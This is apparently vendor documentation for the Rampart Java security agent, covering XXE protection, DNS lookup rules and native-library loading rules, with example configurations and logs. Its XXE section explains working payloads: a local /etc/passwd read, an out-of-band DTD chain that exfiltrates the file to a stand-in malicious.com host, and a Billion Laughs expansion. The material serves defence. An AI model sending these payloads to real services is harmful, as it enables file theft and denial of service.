An XML External Entity (XXE) attack can occur in an application that reads in and processes XML. While this attack could potentially happen by reading in local XML files, this particular kind of attack is more common when the XML comes from a remote source, which is quite often the case with web applications. If an attacker knows that XML can be sent to an endpoint where it will be processed, the attacker can send an XML payload that could make the application perform server-side request forgery, read files from the local file-system, or even cause denial-of-service attacks.

XXE attacks are made possible through the use of the Document Type Definition (DTD). DTD is intended to be a way to define the legal building blocks of an XML document. This is done by defining elements and entities. Entities are commonly used to define constant values that can be referenced within the XML. DTD can be defined locally or by importing a .dtd file from a SYSTEM (local) or PUBLIC (remote) source.

### XML Components

**student.xml**

```
<?xml version=”1.0” encoding=”UFT-8”?>
<DOCTYPE students [
	<!ELEMENT students		(student*)>
<!ELEMENT student		(id, firstname, lastname, gpa)>
<!ELEMENT id		(#PCDATA)>
<!ELEMENT gpa		(#PCDATA)>
<!ENTITY medal1		“&#129351;”>
]>
<students>
<student>
	<id>NYU000000001</id>
	<gpa>3.4</gpa>
</student>
<student>
	<id>NYU000000002</id>
	<gpa>3.75 &medal1;</gpa>
</student>
<student>
	<id>NYU000000003</id>
	<gpa>3.62</gpa>
</student>
</students>
```

💡 Notice the use of the medal1 general entity which is referenced in the XML body as &medal1;. This is known as a general entity reference. There are also parameter entities, which have a very similar syntax, and can be referenced using the '%entity;' syntax rather than the '&entity;' syntax.

In the example shown here, the DTD is embedded within the XML document itself. The DTD provides a definition of all of the legal building blocks of the XML which the XML body is abiding by. It is also possible to move the DTD section to an external source as a local file or on a remote server. In this case, the XML could be updated to point to the external source.

**students.dtd**

```
<!ELEMENT students (student*)>

<!ELEMENT student (id, firstname, lastname, gpa)>

<!ELEMENT id (#PCDATA)>

<!ELEMENT gpa (#PCDATA)>

<!ENTITY medal1 "&#129351;">
```

**Local File - SYSTEM**

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE students SYSTEM "students.dtd">

<students>

...

</students>
```

**Remote Server - PUBLIC**

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE students PUBLIC "http://campus.com/dtds/students.dtd">

<students>

...

</students>
```

### XXE Attacks

In order for an XXE attack to happen, the attacker needs to include a Document Type Definition (DTD). Without it, it is not possible to perform an attack of this nature. A common scenario where an XXE can arise is with web applications that receive HTTP POST requests with XML in the body. In such cases, the application generally does not require the posted XML to include a DTD section in the prolog. It is not even necessary to supply an XML declaration. It may come as a surprise that an attacker can intercept an HTTP request, and change the body of the request to purposely include these components. Once the amended XML is processed by the application, the XML parser/processor handles the DTD provided by the attacker and performs the requested actions such as processing external entities or evaluating entity references.

### Local File Inclusion Example

**HTTP POST Request**

```
<?xml version="1.0" ?>

<!DOCTYPE foo [

<!ELEMENT foo ANY >

<!ENTITY xxe SYSTEM "file:///etc/passwd" >

]>

<foo>&xxe;</foo>
```

In this classic example, the attacker is using a general external ‘ENTITY’ declaration named ‘xxe’ to get access to a local file on the server using the ‘file://’ protocol via the inclusion of the ‘SYSTEM’ keyword. In this case, the file being accessed is ‘/etc/passwd’. Using the entity reference ‘&xxe;’ in the XML body, the reference is expanded with the contents of the file. Depending on the logic of the application, it is possible that the HTTP response is returned to the attacker with the contents of the file. As we can see, the file being accessed has nothing to do with an entity definition, or DTD in general, but the system tries to access this file as requested.

### Server-Side Request Forgery Example

**HTTP POST Request**

```
<?xml version="1.0" ?>

<!DOCTYPE hack [

<!ENTITY % xxe SYSTEM 'http://malicious.com/dtds/xxe.dtd'>

%xxe;

%bravo;

]>

<hack>&charlie;</hack>
```

**xxe.dtd**

```
<!ENTITY % data SYSTEM "file:///etc/passwd">

<!ENTITY % bravo "<!ENTITY charlie SYSTEM 'http://malicious.com/xxe/get?d=%data;'>">
```

In this example, the attacker hosts and controls the remote ‘xxe.dtd’ file, located at ‘http://malicious.com/dtds/xxe.dtd’. The attacker also controls an endpoint where data can be received, located at ‘http://malicious.com/xxe/get’, which takes a URL parameter of ‘d’ that has the victim's data assigned to it.

When the attacker sends the malicious XML to the victim's server, the XML parser/processor first downloads the malicious ‘xxe.dtd’ file that contains the new parameter ‘ENTITY’ definitions of ‘data’ and ‘bravo’. The ‘bravo’ parameter declares a value, which is actually a general external ‘ENTITY’ called ‘charlie’ which contains a URL back to the attacker's server. Notice that the URL parameter ‘d’ is assigned a parameter entity reference of ‘%data’ which points directly to the `/etc/passwd` file.

Returning to the XML that was posted to the victim's server, the DTD makes references to the new components in ‘xxe.dtd’ which includes them and the general entity named ‘charlie’in the DTD. Unlike parameter entities, general entities can be referenced in the XML body. Once the ‘&charlie;’ reference is processed, the chain of events happens. The file `/etc/passwd` is read and an HTTP request is made back to the attacker's server with the contents of the file.

### Denial of Service Example

**HTTP POST Request**

```
<?xml version="1.0"?>

<!DOCTYPE lolz [

<!ELEMENT lolz (#PCDATA)>

<!ENTITY lol "lol">

<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">

<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">

<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">

<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">

<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">

<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">

<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">

<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">

<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">

]>

<lolz>&lol9;</lolz>
```

In this example, the attacker doesn’t use any external components. Instead the idea is to cause the application to struggle and crash through the use of an overwhelming amount of general entity references. The very first entity, `lol`, is assigned the value `"lol"`. The subsequent entities are chained, with each entity referencing the previous entity ten times.

When the entity reference `&lol9`; is processed in the XML body, the result of this chain causes the original `lol` entity to be referenced one billion times. This causes the original value of `"lol"`, which is three characters in length, to expand to a string of three billion characters. This is famously known as the ‘Billion Laughs’ attack.

### XXE Protection

While different XML parsers do offer users the ability to define configuration that provides protection against XXE attacks, protection is generally not active by default. Older systems, including older versions of Java, have faulty XML parser/processor implementations and may not honor the security configuration even if it were provided.

The XXE security feature addresses attacks regardless of Java version or XML parser, by enforcing a strict policy of what the XML can contain. There are two main parameters that can be configured in the XXE security feature. All configuration is optional, and is only required if it is necessary to relax the rule for certain scenarios.

### Given (Condition)

There are no specific conditions under which XXE protection is configured.

### When (Event)

| Keyword | Description |
| ------- | ----------- |
| xxe | The keyword ‘xxe’ is one of two components that must be supplied in the ‘marshal’ rule with only one being allowed to be configured in a single rule. ‘uri’ and ‘reference’ are the only parameters accepted.|

| Parameter | Description |
| --------- | ----------- |
| uri | Only available in ‘allow’ mode. An array of ‘SYSTEM’ or ‘PUBLIC’ URIs/URLs, declared within the DTD, that are required to be allowed. |
| reference | Only available in `protect` mode. Defines two limits:
• ‘limit’: The number of general entity references allowed before the Rampart marshal rule triggers. The default value is ‘0’.
• ‘expansion-limit’: The expanded string length that can be used before the protection kicks in. The default value is ‘0’. |

### Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | When the rule triggers, the application is prevented from parsing / processing the XML, therefore obviating the XXE attack vector. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. A log message is generated with details of the event. A log message must be specified with this action. |
| allow | An attempt that would otherwise be considered an attack has been allowed, and the application continues as normal. If configured, a log message is generated with details of the event. With this action, the 'uri' parameter must be used to define a list of allowed URIs/URLs. |

As part of the action statement, the user may optionally specify the parameter 'stacktrace: “full”'. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

### Rule Configuration

**Protect Example**

```
app("XXE SECURITY POLICY"):
    requires(version: Rampart/2.10)
    marshal("XXE:PROTECT"):
        xxe()
        protect(message: "An XXE attack has been blocked", severity: high)
    endmarshal
endapp
```

The above `protect` example provides the simplest and most restrictive configuration of the rule. Notice that the optional `reference` parameter is not provided. This means that 0 entity references are allowable and neither are string expansions arising from entity references. The `uri` parameter is not available to use in the 'protect' configuration. All URIs are blocked by default. Any URI that needs to be allowed must be configured in an `allow` rule.

```
app("XXE SECURITY POLICY"):
    requires(version: Rampart/2.10)
    marshal("XXE:PROTECT"):
        xxe(reference: {limit: 5, expansion-limit: 50})
        protect(message: "An XXE attack has been blocked", severity: high)
    endmarshal
endapp
```

In this `protect` example, the rule is relaxed slightly for cases where a handful of entity references are required. Notice that the ‘reference’ parameter has been configured with a limit of 5, and a string ‘expansion-limit’ of 50. Any XML that tries to make use of more entity references or tries to expand a reference to a string length greater than 50 characters will not be processed.

### **Detect Example**

```
app("XXE SECURITY POLICY"):
    requires(version: Rampart/2.10)
    marshal("XXE:DETECT"):
        xxe()
        detect(message: "An XXE attack has been detected", severity: high)
    endmarshal
endapp
```

The `detect` action is a good way to see how an application responds to the XXE security feature before putting the rule into 'protect' mode. Any alerts produced as a consequence of the rule are reported in the security log file but the application continues to run as normal. This gives application owners the ability to review and evaluate any potential issues so the rule can be tuned to meet their needs. This is particularly true of applications that read in XML configuration during application startup.

### Allow Example

```
app("XXE SECURITY POLICY"):
    requires(version: Rampart/2.10)
        marshal("XXE:ALLOW"):
            xxe(uri: ["http://struts.apache.org/dtds/struts-2.10.dtd",
                "http://struts.apache.org/dtds/struts-2.10.dtd",
                "http://java.sun.com/dtd/web-jsptaglibrary_1_2.dtd",
                "http://java.sun.com/j2ee/dtds/web-jsptaglibrary_1_1.dtd"])
            allow(message: "An external DTD URI has been allowed")
    endmarshal
endapp
```

The `allow` action is used in conjunction with a secondary XXE rule configured with a `protect` action. A rule configured with the ‘allow’ action gives application owners the ability to permit certain URIs defined in the XML to be accessed. Changing the XXE rule from an action of `protect` to ‘detect’ helps identify any URIs that may need to be allowed. Once identified, the `uri` parameter can be configured to allow only those specific URIs. Attempts to access URIs outside of the list are blocked.

### Logging

**Protect Example**

```
<10>1 2022-02-18T12:51:22.1049Z fedora java 226858 - - CEF:0|Rampart:Rampart|Rampart|2.10|XXE :PROTECT|Execute Rule|High|internalHttpRequestUri=/customer/add reason=The XML is using an external source: SYSTEM file:///etc/passwd procid=226858 dvchost=fedora localIpAddress=127.0.0.1 payload=<!-- <msg>hi</msg> -->\n\n<!DOCTYPE test\n [\n <!ELEMENT xxe ANY>\n <!ENTITY xxe SYSTEM "file:///etc/passwd">\n ]\n>\n<forum>\n <username>2.2.10.RELEASE</username>\n <message>&xxe;</message>\n</forum> httpRequestUri=/oval/api/vuln/xml httpRequestMethod=GET msg=An XXE attack has been blocked! ruleType=marshal appVersion=1 securityFeature=marshal external xml entity protection remoteIpAddress=127.0.0.1 rt=Feb 18 2022 12:51:22.1049 +0000 act=protect
```

This log message shows that triggering the external SYSTEM URI of 'file:///etc/passwd' has been blocked.

```
<10>1 2022-02-18T12:52:56.167Z fedora java 226858 - - CEF:0|Rampart:Rampart|Rampart|2.10|XXE :PROTECT|Execute Rule|High|internalHttpRequestUri=/customer/add reason=The XML entity 'lol1' is referenced: 10 time(s) in the XML DTD. The rule is configured with a reference limit of: 5 procid=226858 dvchost=fedora localIpAddress=127.0.0.1 payload=<?xml version\="1.0"?>\n<!DOCTYPE lolz\n [\n <!ELEMENT lolz (#PCDATA)>\n <!ENTITY lol "lol">\n <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n ]\n>\n<lolz>&lol9;</lolz> httpRequestUri=/oval/api/vuln/xml httpRequestMethod=GET msg=An XXE attack has been blocked! ruleType=marshal appVersion=1 securityFeature=marshal external xml entity protection remoteIpAddress=127.0.0.1 rt=Feb 18 2022 12:52:56.166 +0000 act=protect
```

This log message shows that there are too many entity references, surpassing the configured limit of 5.

```
<10>1 2022-02-18T12:54:13.931Z fedora java 226858 - - CEF:0|Rampart:Rampart|Rampart|2.10|XXE :PROTECT|Execute Rule|High|internalHttpRequestUri=/customer/add reason=The XML has a circular reference: 'aaa' procid=226858 dvchost=fedora localIpAddress=127.0.0.1 payload=<?xml version\="1.0"?>\n<!DOCTYPE lolz [\n <!ELEMENT lolz (#PCDATA)>\n <!ENTITY aaa "&ccc;">\n <!ENTITY bbb "&aaa;">\n <!ENTITY ccc "&bbb;">\n ]>\n<lolz>&aaa;</lolz> httpRequestUri=/oval/api/vuln/xml httpRequestMethod=GET msg=An XXE attack has been blocked! ruleType=marshal appVersion=1 securityFeature=marshal external xml entity protection remoteIpAddress=127.0.0.1 rt=Feb 18 2022 12:54:13.931 +0000 act=protect
```

This log message shows that circular entity references have been disallowed.

### **Detect Example**

```
<10>1 2022-02-18T13:23:18.741Z localhost java 4414 - - CEF:0|Rampart:Rampart|Rampart|2.10|XXE:DETECT|Execute Rule|High|msg=A potential XXE attack has been detected! Please review. reason=The XML is using an external source: PUBLIC http://www.bea.com/servers/wls810/dtd/weblogic810-ra.dtd rt=Feb 18 2022 13:23:18.741 +0000 appVersion=1 act=detect payload=<?xml version\="1.0"?>\n\n<!DOCTYPE weblogic-connection-factory-dd PUBLIC '-//BEA Systems, Inc.//DTD WebLogic 9.0.0 Connector//EN' 'http://www.bea.com/servers/wls810/dtd/weblogic810-ra.dtd'>\n\n<weblogic-connection-factory-dd>\n\n <connection-factory-name>WLSJMSInternalConnectionFactoryNoTX</connection-factory-name>\n <jndi-name>eis/jms/internal/WLSConnectionFactoryJNDINoTX</jndi-name>\n <pool-params>\n <initial-capacity>0</initial-capacity>\n <max-capacity>100</max-capacity>\n </pool-params>\n <use-connection-proxies>false</use-connection-proxies>\n\n</weblogic-connection-factory-dd> dvchost=localhost ruleType=marshal procid=4414 securityFeature=marshal external xml entity protection
```

This log message shows that an external PUBLIC URI of `http://www.bea.com/servers/wls810/dtd/weblogic810-ra.dtd` has been configured within the XML being processed. Reviewing this information, we can make a determination if that external DTD file is safe to access. In this case, the WebLogic application server appears to depend on this dtd file so allowing it may be necessary. It is possible to review the contents of the dtd file at the stated URL to validate what level of risk it poses.

```
<10>1 2022-02-18T13:21:27.681Z localhost java 4197 - - CEF:0|Rampart:Rampart|Rampart|2.10|XXE:DETECT|Execute Rule|High|msg=A potential XXE attack has been detected! Please review. reason=The XML body is using entity references '1 time(s). The rule is configured with a reference limit of: 0 rt=Feb 18 2022 13:21:27.681 +0000 appVersion=1 act=detect payload=<?xml version\="1.0" encoding\="UTF-8"?>\n<Policy xmlns\="urn:oasis:names:tc:xacml:2.0:policy:schema:os" PolicyId\="urn:bea:xacml:2.0:entitlement:resource:type@E@Furl@G@M@Oapplication@Ewls-management-services@M@OcontextPath@E@Umanagement@M@Ouri@E@Uweblogic@U@K@M@OhttpMethod@EOPTIONS" RuleCombiningAlgId\="urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:first-applicable"><Description>?weblogic.entitlement.rules.UncheckedPolicy()</Description><Target><Resources><Resource><ResourceMatch MatchId\="urn:oasis:names:tc:xacml:1.0:function:string-equal"><AttributeValue DataType\="http://www.w3.org/2001/XMLSchema#string">type\=&lt;url&gt;, application\=wls-management-services, contextPath\=/management, uri\=/weblogic/*, httpMethod\=OPTIONS</AttributeValue><ResourceAttributeDesignator AttributeId\="urn:oasis:names:tc:xacml:2.0:resource:resource-ancestor-or-self" DataType\="http://www.w3.org/2001/XMLSchema#string" MustBePresent\="true"/></ResourceMatch></Resource></Resources></Target><Rule RuleId\="unchecked-policy" Effect\="Permit"></Rule></Policy> dvchost=localhost ruleType=marshal procid=4197 securityFeature=marshal external xml entity protection
```

This log message shows that the XML being processed identified a reference 1 time. Reviewing the contents of the XML will help determine if in this scenario the use of a single entity reference poses any risk. As mentioned in the section on Denial of Service, general entity references can become dangerous when many are chained together.

### **Allow Example**

```
<13>1 2022-02-18T13:44:50.051Z localhost java 5308 - - CEF:0|Rampart:Rampart|Rampart|2.10|XXE:ALLOW|Execute Rule|Unknown|msg=An external URI has been allowed. reason=The XML is using an external source: PUBLIC http://www.bea.com/servers/wls810/dtd/weblogic810-ra.dtd rt=Feb 18 2022 13:44:50.051 +0000 appVersion=1 act=allow payload=<?xml version\="1.0"?>\n\n<!DOCTYPE weblogic-connection-factory-dd PUBLIC '-//BEA Systems, Inc.//DTD WebLogic 9.0.0 Connector//EN' 'http://www.bea.com/servers/wls810/dtd/weblogic810-ra.dtd'>\n\n<weblogic-connection-factory-dd>\n\n <connection-factory-name>WLSJMSInternalConnectionFactoryNoTX</connection-factory-name>\n <jndi-name>eis/jms/internal/WLSConnectionFactoryJNDINoTX</jndi-name>\n <pool-params>\n <initial-capacity>0</initial-capacity>\n <max-capacity>100</max-capacity>\n </pool-params>\n <use-connection-proxies>false</use-connection-proxies>\n\n</weblogic-connection-factory-dd> dvchost=localhost ruleType=marshal procid=5308 securityFeature=marshal external xml entity protection
```

This log message shows the result of an XXE configured with an ‘allow’ action, and with a ‘message’ parameter. A security log entry is generated for the URI that has been allowed, which in this case is the external PUBLIC URI of `http://www.bea.com/servers/wls810/dtd/weblogic810-ra.dtd`.

# **Rampart DNS Rule**

ℹ️ Please see the **API Protect Directives** section of the Rampart documentation for information on how to configure this rule for API endpoint protection.

## Overview

The DNS security rule provides the ability to log and restrict DNS lookups performed by any application running on the Java Virtual Machine. By restricting DNS lookups to known and trusted domains, abuse of the DNS service can be prevented.

The DNS rule begins with a `dns` keyword and ends with an `enddns` keyword. It must contain the rule name as a parameter and this is an arbitrary string, hence it needs to be surrounded with double-quotes.

The rule cannot contain duplicate statements, however, multiple 'dns' rules are allowed in the same Rampart application, and the order of statements inside the 'dns' rule does not matter.

## Given (Condition)

| lookup | The ‘lookup’ takes a single parameter (string literal) where valid values are a quoted-hostname, a quoted-IPv4 address, or the constant ‘any’ indicating any hostname or IPv4 address.
```
lookup("example.com")
lookup("127.0.0.1")
lookup(any)
```
IPv6 addresses are not currently supported. |

## Then (Action)

An Action accepts a `message` as its parameter.

An action may optionally specify a severity. The value of ‘severity’ may be an integer in the range of 0-10 (0 is the lowest level and 10 is the highest level) or one of `Low’, ‘Medium’, ‘High’ or ‘Very-High`(case insensitive). The default severity is unknown.

| Action | Description |
| ------ | ----------- |
| protect | The DNS lookup is not allowed to proceed. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal; the DNS lookup is allowed to proceed. If configured, a log message is generated detailing that the agent has detected an attempt to carry out a DNS lookup. A log message must be specified with this action. |
| allow | Can be used to allow specific IP addresses/hostnames to be looked up without being blocked by other DNS rule(s). |

As part of the action statement, the user may optionally specify the parameter 'stacktrace: “full”'. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

DNS rule with quoted-hostname:

```
app("DNS lookup mod"):
    requires(version: Rampart/2.10)
    dns("Blocking address resolution for example.com")
        lookup("example.com")
        protect(message: "dns lookup occurred for example.com", severity: 8)
    enddns
endapp
```

DNS rule with quoted-IPv4 address:

```
app("DNS lookup mod"):
    requires(version: Rampart/2.10)
    dns("Detecting address resolution for localhost"):
        lookup("127.0.0.1")
        detect(message: "dns lookup event", severity: 6)
    enddns
endapp
```

DNS rule with the constant `any`:

```
app("DNS lookup mod"):
    requires(version: Rampart/2.10)
    dns("Detecting address resolution for any host/ip"):
        lookup(any)
        detect(message: "dns lookup event", severity: 4)
    enddns
endapp
```

### Logging

A log entry similar to the following is generated when the below 'dns' rules identify a DNS lookup:

```
<10>1 2021-03-22T12:58:06.136Z userX_system java 17522 - - CEF:0|Rampart:Rampart|Rampart|2.10|DNS Test App detect|Execute Rule|High|rt=Mar 22 2021 12:58:06.135 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=17522 appVersion=1 ruleType=dns securityFeature=dns act=detect msg=Walter hostname=example.com
```

## Further Examples

DNS rule with the stacktrace also logged:

```
app("DNS lookup mod"):
    requires(version: Rampart/2.10)
    dns("Detecting address resolution for localhost"):
        lookup(any)
        protect(message: "dns lookup event", severity: 9, stacktrace: "full")
    enddns
endapp
```

### Logging

```
<10>1 2021-04-01T12:31:39.637+01:00 userX_system java 174476 - - CEF:0|Rampart:Rampart|Rampart|2.10|DNS Test App protect|Execute Rule|High|rt=Apr 01 2021 12:31:39.636 +0100 dvchost=ckang-XPS-15-9570 procid=174476 appVersion=1 ruleType=dns securityFeature=dns act=protect msg=dns lookup event
stacktrace=walter.apps.DNSLookupApp.main(Container-1)(DNSLookupApp.java:94)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\njava.lang.Thread.run(Container-1)(Thread.java:876)\njava.lang.Thread.begin(Container-1)(Thread.java:897)\njava.lang.Thread.invokeRun(Container-1)(Thread.java:883)\njava.lang.Thread$ThreadHandler.invokeRun(Container-1)(Thread.java:55) hostname=alto.aws.example.lan
```

# **Rampart Library Rule**

## Overview

The Rampart library rule can be used to control native library loading. This is useful to prevent unauthorized attempts by an application to load native libraries.

## Given (Condition)

To control native library loading using the Rampart ‘library’ rule the user must specify the ‘load’ declaration.

| load | A parameter must be supplied to the ‘load’ declaration to specify the libraries to which the Rampart ‘library’ rule controls loading. Both Unix and Windows filesystem paths are supported. This parameter takes the form of a list of one or more quoted strings indicating specifically targeted native libraries and directories containing such native libraries. Each string represented in the parameter can be:
• a single library name - the agent controls access to any library on the filesystem that matches the given name
• an absolute path to a specific library

The wildcard character (*) is supported anywhere in the library name or path:
• only one wildcard character can be used with each path
• the wildcard can only target a single directory
• the wildcard can be used to specify all libraries with a specific prefix
• the wildcard character specified on its own represents all native libraries on the filesystem |
## When (Action)

There are three supported actions for the Rampart ‘library’ rule: `protect’, ‘detect’ and ‘allow.`

| Action | Description |
| ------ | ----------- |
| protect | Any attempt to load a protected native library is blocked. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. Any attempt to load a native library specified by the Rampart ‘library’ rule is allowed. If configured, a log message is generated with details of the event. A log message must be specified with this action. |
| allow | Can be used to allow loading of specific libraries which are a subset of protected libraries covered by a Rampart ‘library’ rule in `protect` mode. |


As part of the action statement, the user may optionally specify the parameter 'stacktrace: “full”'. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

All examples of the Rampart `library` rule are given for both Unix and Windows style filesystem paths, where appropriate.

In the following example, we define a Rampart ‘library’ rule that prevents loading all native libraries inside a specific directory.

Unix:

```
app("Library mod"):
    requires(version: Rampart/2.10)
    library("Prevent loading of all native libraries in specific directory"):
        load("/tmp/*")
        protect(message: "Blocked attempt to load library", severity: High)
endlibrary
endapp
```

Windows:

```
app("Library mod"):
    requires(version: Rampart/2.10)
    library("Prevent loading of all native libraries in specific directory"):
        load("C:\\Windows\\*")
        protect(message: "Blocked attempt to load library", severity: High)
    endlibrary
endapp
```

**Logging**

Unix:

```
<10>1 2021-03-31T10:52:42.103+01:00 userX_system java 6229 - - CEF:0|Rampart:Rampart|Rampart|2.10|Prevent loading of all native libraries in specific directory|Execute Rule|High|rt=Mar 31 2021 10:52:42.102 +0100 dvchost=userX_system procid=6229 appVersion=1 ruleType=library securityFeature=library act=protect msg=Blocked attempt to load library path=/tmp/libCounter.so
```

Windows:

```
<10>1 2021-03-30T16:56:46.512+01:00 userX_system java 4349 - - CEF:0|Rampart:Rampart|Rampart|2.10|Prevent loading of all native libraries in specific directory|Execute Rule|High|rt=Mar 30 2021 16:56:46.512 +0100 dvchost=userX_system procid=4349 appVersion=1 ruleType=library securityFeature=library act=protect msg=Blocked attempt to load library path=C:\\Windows\\Counter.dll
```

## Further Examples

**As above, with the stacktrace also logged**

Unix:

```
app("Library mod - with stacktrace"):
    requires(version: Rampart/2.10)
    library("Prevent loading of all native libraries in specific directory"):
        load("/tmp/*")
        protect(message: "Blocked attempt to load library", severity: High, stacktrace: "full")
endlibrary
endapp
```

Windows:

```
app("Library mod - with stacktrace"):
    requires(version: Rampart/2.10)
    library("Prevent loading of all native libraries in specific directory"):
        load("C:\\Windows\\*")
    protect(message: "Blocked attempt to load library", severity: High, stacktrace: "full")
endlibrary
endapp
```

### Logging

Unix:

```
<10>1 2021-04-01T12:10:21.282+01:00 userX_system java 27607 - - CEF:0|Rampart:Rampart|Rampart|2.10|Prevent loading of all native libraries in specific directory|Execute Rule|High|rt=Apr 01 2021 12:10:21.282 +0100 dvchost=userX_system procid=27607 appVersion=1 ruleType=library securityFeature=library act=protect msg=Blocked attempt to load library stacktrace=com.example.jvi.RuntimeSystemEnv.load0(RuntimeSystemEnv.java:175)\njava.lang.System.loadLibrary(Container-1)(System.java)\nCounter.<clinit>(Container-1)(Counter.java:17)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\njava.lang.Thread.run(Container-1)(Thread.java:876)\njava.lang.Thread.begin(Container-1)(Thread.java:897)\njava.lang.Thread.invokeRun(Container-1)(Thread.java:883)\njava.lang.Thread$ThreadHandler.invokeRun(Container-1)(Thread.java:55) path=/tmp/libCounter.so
```

Windows:

```
<10>1 2021-04-01T12:09:43.442+01:00 userX_system java 25465 - - CEF:0|Rampart:Rampart|Rampart|2.10|Prevent loading of all native libraries in specific directory|Execute Rule|High|rt=Apr 01 2021 12:09:43.442 +0100 dvchost=userX_system procid=25465 appVersion=1 ruleType=library securityFeature=library act=protect msg=Blocked attempt to load library stacktrace=com.example.jvi.RuntimeSystemEnv.load0(RuntimeSystemEnv.java:175)\njava.lang.System.loadLibrary(Container-1)(System.java)\nCounter.<clinit>(Container-1)(Counter.java:17)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\njava.lang.Thread.run(Container-1)(Thread.java:876)\njava.lang.Thread.begin(Container-1)(Thread.java:897)\njava.lang.Thread.invokeRun(Container-1)(Thread.java:883)\njava.lang.Thread$ThreadHandler.invokeRun(Container-1)(Thread.java:55) path=C:\\Windows\\Counter.dll
```

**Prevent loading a specific native library**

Unix:

```
app("Library mod 2"):
    requires(version: Rampart/2.10)
    library("Prevent loading a specific native library"):
        load("/tmp/libCounter.so")
        protect(message: "Blocked attempt to load library", severity: High)
    endlibrary
endapp
```

Windows:

```
app("Library mod 2"):
    requires(version: Rampart/2.10)
        library("Prevent loading a specific native library"):
        load("C:\\Windows\\Counter.dll")
        protect(message: "Blocked attempt to load library", severity: High)
    endlibrary
endapp
```

**Detect loading of any library with a specific name**

Unix:

```
app("Library mod 3"):
    requires(version: Rampart/2.10)
        library("Detect loading a native library with a specific name"):
        load("libCounter.so")
        detect(message: "Detected attempt to load library", severity: 6)
    endlibrary
endapp
```

Windows:

```
app("Library mod 3"):
    requires(version: Rampart/2.10)
        library("Detect loading a native library with a specific name"):
        load("Counter.dll")
        detect(message: "Detected attempt to load library", severity: 6)
    endlibrary
endapp
```

**Prevent loading of all native libraries, except allow specific library to be loaded**

Unix:

```
app("Library mod 4"):
    requires(version: Rampart/2.10)
        library("Prevent loading all native libraries"):
            load("*")
            protect(message: "Blocked attempt to load library", severity: 10)
        endlibrary
        library("Detect loading a native library with a specific name"):
            load("/tmp/libCounter.so")
            allow(message: "Access granted to load particular native library", severity: Medium)
        endlibrary
endapp
```

Windows:

```
app("Library mod 4"):
    requires(version: Rampart/2.10)
        library("Prevent loading all native libraries"):
            load("*")
            protect(message: "Blocked attempt to load library", severity: 10)
        endlibrary
        library("Detect loading a native library with a specific name"):
            load("C:\\Windows\\Counter.dll")
            allow(message: "Access granted to load particular native library", severity: Medium)
        endlibrary
endapp
```

# **Rampart Filesystem Rule**

## **Path Traversal Security Feature**

### Overview

An application is vulnerable to Path Traversal(also known as Directory Traversal) attacks when unvalidated or unsanitized user input is used to construct a path that is intended to identify a file or directory located underneath a restricted parent directory. For such an application, the user can construct a path name that traverses the file system to a location outside the scope of the restricted parent directory.

There are two types of Path Traversal attacks:

- Relative Path Traversal
- Absolute Path Traversal
